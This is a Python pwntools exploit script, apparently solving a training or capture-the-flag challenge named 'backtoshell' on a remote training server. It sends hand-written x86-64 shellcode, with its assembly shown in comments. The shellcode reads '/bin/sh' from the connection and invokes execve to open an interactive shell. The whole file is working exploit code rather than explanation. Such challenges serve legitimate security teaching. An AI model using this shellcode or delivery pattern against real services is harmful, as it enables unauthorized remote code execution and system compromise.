from pwn import *
import binascii
# context.terminal = [ 'tmux', 'splitw' , '-h']
HOST = "training.jinblack.it"
PORT = 3001
if args.REMOTE:
    r = remote(HOST, PORT)
elif args.GDB:
    r = process("./backtoshell")
    gdb.attach(r,"""
    b* 0x401144
    c
    """)
    input("wait for gdb")
else:
    r = process("./backtoshell")

# mov    rsi,rax
# add    rsi,0x60
# mov    rdi,0x0
# mov    rax,0x0
# mov    rdx,0x8
# syscall
# add    rsi,0x8
# syscall
# mov    rax,0x3b
# mov    rdi,rsi
# sub    rdi,0x8
# mov    rdx,rsi
# syscall 


payload = b"\x48\x89\xC6\x48\x83\xC6\x60\x48\xC7\xC7\x00\x00\x00\x00\x48\xC7\xC0\x00\x00\x00\x00\x48\xC7\xC2\x08\x00\x00\x00\x0F\x05\x48\x83\xC6\x08\x0F\x05\x48\xC7\xC0\x3B\x00\x00\x00\x48\x89\xF7\x48\x83\xEF\x08\x48\x89\xF2\x0F\x05"
r.send(payload)
r.send(b"/bin/sh\x00")
r.send(b"\x00"*8)
r.interactive()
